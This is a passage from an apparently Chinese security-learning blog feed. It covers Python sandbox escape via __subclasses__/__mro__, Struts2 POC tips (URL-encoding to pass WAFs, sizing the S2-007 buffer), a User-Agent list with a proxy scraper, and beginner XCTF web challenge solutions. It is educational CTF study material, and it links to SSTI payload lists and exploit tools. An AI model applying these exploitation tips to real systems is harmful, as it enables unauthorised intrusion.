class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, </span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;, </span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, </span><br><span class="line"> &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;,</span><br><span class="line">  &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;,</span><br><span class="line">    &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;,</span><br><span class="line">    &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, </span><br><span class="line">    &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.getwindowsversion&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;nt.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;nt.statvfs_result&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteCodec&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteIncrementalEncoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteIncrementalDecoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteStreamReader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteStreamWriter&#x27;</span>&gt;]</span><br></pre></td></tr></table></figure></div>

<p><strong>_<em>subclasses</em>_()</strong> ：查看当前类的子类。</p>
<p>当然我们也可以直接用 **object._<em>subclasses</em><em>()**，会得到和上面一样的结果。<br>获取基类还能用还有 **_<em>mro</em></em>**，比如：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用索引获取基类</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<h1 id="力推参考学习"><a href="#力推参考学习" class="headerlink" title="力推参考学习"></a>力推参考学习</h1><p><a href="https://blog.csdn.net/qq_43390703/article/details/104256001">python沙箱逃逸</a></p>
<p><a href="https://github.com/epinna/tplmap">SSTi神器–Tplmap</a></p>
<p><a href="https://blog.csdn.net/weixin_43536759/article/details/105066445">SSTI注入语句总结</a></p>
<p><a href="https://blog.csdn.net/wy_97/article/details/80393854">python沙箱逃逸一些套路的小结</a></p>
<p><a href="https://www.freebuf.com/articles/system/203208.html">一文看懂Python沙箱逃逸</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Strust2 挖坑记录</title>
    <url>/yakko117/2020/02/24/Struts2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><a href="https://www.cnblogs.com/qiantan/p/10695567.html">struts2漏洞总结(到19年4月)</a><br><a href="https://www.freebuf.com/tag/struts2%E6%BC%8F%E6%B4%9E">Struts2漏洞</a><br><a href="https://github.com/vulhub/vulhub/tree/master/struts2">vulhub</a><br><a href="https://www.cnblogs.com/leaf-7/p/5509527.html">struts2 s2-005&#x2F;s2-009&#x2F;s2-013&#x2F;s2-016&#x2F;s2-019 payload</a><br><a href="https://www.jianshu.com/p/1d0987abbe29">Struts-S2-007漏洞利用（含环境搭建、含POC、含POC问题解决方案）</a><br><a href="https://www.cnblogs.com/hayasi/category/869760.html">Struts2 源码分析</a><br><a href="https://www.freebuf.com/vuls/168609.html">Struts2著名RCE漏洞引发的十年之思</a></p>
<hr>
<h1 id="tags"><a href="#tags" class="headerlink" title="tags"></a>tags</h1><h2 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h2><p>打<code>poc</code> 的时候，最好自己多注意一下 <code>Tomcat</code> 的版本，很多在 <code>Tomcat7</code> 能直接打的 <code>poc</code>，在8的版本可能会报 <code>400</code>，或者是无回显，主要原因是 <code>\</code> <code>&#39;</code> <code>&quot;</code> 这种在 <code>path</code>提交会被waf，通常情况可以将 <code>poc</code> 进行一次 <code>URL编码</code>，然后看是否可以打进去<br>(实在打poc无效，那就听天命吧，毕竟鬼知道别人的后台怎么搭的，鬼知道shell会弹到哪个位置）</p>
<hr>
<h2 id="poc解析问题"><a href="#poc解析问题" class="headerlink" title="poc解析问题"></a>poc解析问题</h2><p>使用<code>S2-007</code>的<code>poc</code>时，注意控制<code>res[num]</code>大小，注意不要将 <code>res</code> 大小超过命令执行结果，否则会回显null。<br>(Buu复现的时候，测到 <code>res=new+byte[1314]</code> 才给flag)</p>
<p><a href="https://github.com/zhzyker/exphub">exp工具库</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>User-Agent 大全</title>
    <url>/yakko117/2020/02/05/User_agent/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>百度整理的(copy 雾)</p>
<span id="more"></span>

<h1 id="PC端"><a href="#PC端" class="headerlink" title="PC端"></a>PC端</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Opera</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60</span><br><span class="line">Opera/8.0 (Windows NT 5.1; U; en)</span><br><span class="line">Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50</span><br><span class="line"></span><br><span class="line">Firefox</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0</span><br><span class="line">Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10</span><br><span class="line"></span><br><span class="line">Safari</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2</span><br><span class="line"></span><br><span class="line">chrome</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36</span><br><span class="line">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11</span><br><span class="line">Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16</span><br><span class="line"></span><br><span class="line">360</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line"></span><br><span class="line">淘宝浏览器</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11</span><br><span class="line"></span><br><span class="line">猎豹浏览器</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span><br><span class="line"></span><br><span class="line">QQ浏览器</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)</span><br><span class="line"></span><br><span class="line">sogou浏览器</span><br><span class="line">Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)</span><br><span class="line"></span><br><span class="line">maxthon浏览器</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36</span><br><span class="line"></span><br><span class="line">UC浏览器</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="移动端"><a href="#移动端" class="headerlink" title="移动端"></a>移动端</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">IPhone</span><br><span class="line">Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line">IPod</span><br><span class="line">Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line">IPAD</span><br><span class="line">Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5</span><br><span class="line">Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br><span class="line"></span><br><span class="line">Android</span><br><span class="line">Mozilla/5.0 (Linux; U; Android 2.2.1; zh-cn; HTC_Wildfire_A3333 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line">Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line"></span><br><span class="line">QQ浏览器 Android版本</span><br><span class="line">MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line"></span><br><span class="line">Android Opera Mobile</span><br><span class="line">Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10</span><br><span class="line"></span><br><span class="line">Android Pad Moto Xoom</span><br><span class="line">Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13</span><br><span class="line"></span><br><span class="line">BlackBerry</span><br><span class="line">Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+</span><br><span class="line"></span><br><span class="line">WebOS HP Touchpad</span><br><span class="line">Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0</span><br><span class="line"></span><br><span class="line">Nokia N97</span><br><span class="line">Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124</span><br><span class="line"></span><br><span class="line">Windows Phone Mango</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; HTC; Titan)</span><br><span class="line"></span><br><span class="line">UC浏览器</span><br><span class="line">UCWEB7.0.2.37/28/999</span><br><span class="line"></span><br><span class="line">NOKIA5700/ UCWEB7.0.2.37/28/999</span><br><span class="line"></span><br><span class="line">UCOpenwave</span><br><span class="line">Openwave/ UCWEB7.0.2.37/28/999</span><br><span class="line"></span><br><span class="line">UC Opera</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="Python3-中的爬虫"><a href="#Python3-中的爬虫" class="headerlink" title="Python3 中的爬虫"></a>Python3 中的爬虫</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url=<span class="string">u&quot;https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/5162711?fr=aladdin&quot;</span></span><br><span class="line">    user_agent=<span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&quot;</span></span><br><span class="line">    header=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:user_agent&#125;</span><br><span class="line">    proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://125.120.11.219:6666&quot;</span>&#125;</span><br><span class="line">    response=requests.get(url,headers=header,proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span> (response.text)</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
      </tags>
  </entry>
  <entry>
    <title>XCTF adworld web（新手入门篇）</title>
    <url>/yakko117/2019/03/17/XCTF%20adworld%20web%EF%BC%88%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E7%AF%87%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="新手训练"><a href="#新手训练" class="headerlink" title="新手训练"></a>新手训练</h1><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>直接 F12 查看</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5isdp4j30nm06w4l5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5isdp4j30nm06w4l5.jpg" class="lazyload"></a></p>
<hr>
<h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p>点开题目看到题目要求</p>
<blockquote>
<p>请用GET方式提交一个名为a，值为1的变量</p>
</blockquote>
<p>输入 <code>?a=1</code> 后，回显新的请求</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5go0hyj30w30biq3u.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5go0hyj30w30biq3u.jpg" class="lazyload"></a><br>然后看到post请求，随后获得flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5gs9dgj30uu0knwgf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5gs9dgj30uu0knwgf.jpg" class="lazyload"></a> </p>
<hr>
<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p><strong>题目描述：</strong> X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧</p>
<p>由题目得知需扫描目录</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5gq7s2j30jw09k74y.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5gq7s2j30jw09k74y.jpg" class="lazyload"></a> </p>
<p>点开 <code>robots.txt</code> ，发现 <em><strong>f1ag_1s_h3re.php</strong></em><br>随后得到flag</p>
<hr>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p><strong>题目描述：</strong> X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：“cookie是夹心饼干的意思吗？”</p>
<p>点开查看</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5guaoyj317l0ni0vl.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5guaoyj317l0ni0vl.jpg" class="lazyload"></a></p>
<p>查看tip 进入 <code>cookie.php</code> 得到flag</p>
<hr>
<h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p><strong>题目描述：</strong> X老师今天上课讲了前端知识，然后给大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p>
<p>删除 <code>disabled</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5larhkj31430e2qv6.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5larhkj31430e2qv6.jpg" class="lazyload"></a></p>
<p>得到flag</p>
<hr>
<h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>点开发现</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8lyjaij30gf08ywyw.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8lyjaij30gf08ywyw.jpg" class="lazyload"></a></p>
<p>不管输入什么回显都一样</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jfaudj30c507tq2s.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jfaudj30c507tq2s.jpg" class="lazyload"></a></p>
<p>查看源代码</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jkduoj31ax0o9dk3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jkduoj31ax0o9dk3.jpg" class="lazyload"></a></p>
<p>发现其中 <code>pass</code> 为假密码,可以看到无论输入什么都会返回这个假密码,真正的密码<br>真正的密码：</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jhvzrj30vk01sdgp.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jhvzrj30vk01sdgp.jpg" class="lazyload"></a></p>
<p>用python2.7跑 </p>
<blockquote>
<p>s&#x3D;”\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30”</p>
</blockquote>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jh3gij30y105et8w.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jh3gij30y105et8w.jpg" class="lazyload"></a></p>
<p>得到 <code>55,56,54,79,115,69,114,116,107,49,50</code></p>
<p>再用py跑</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> future <span class="keyword">import</span> print_function</span><br><span class="line">s=[<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>得到 <code>786OsErtk12</code></p>
<hr>
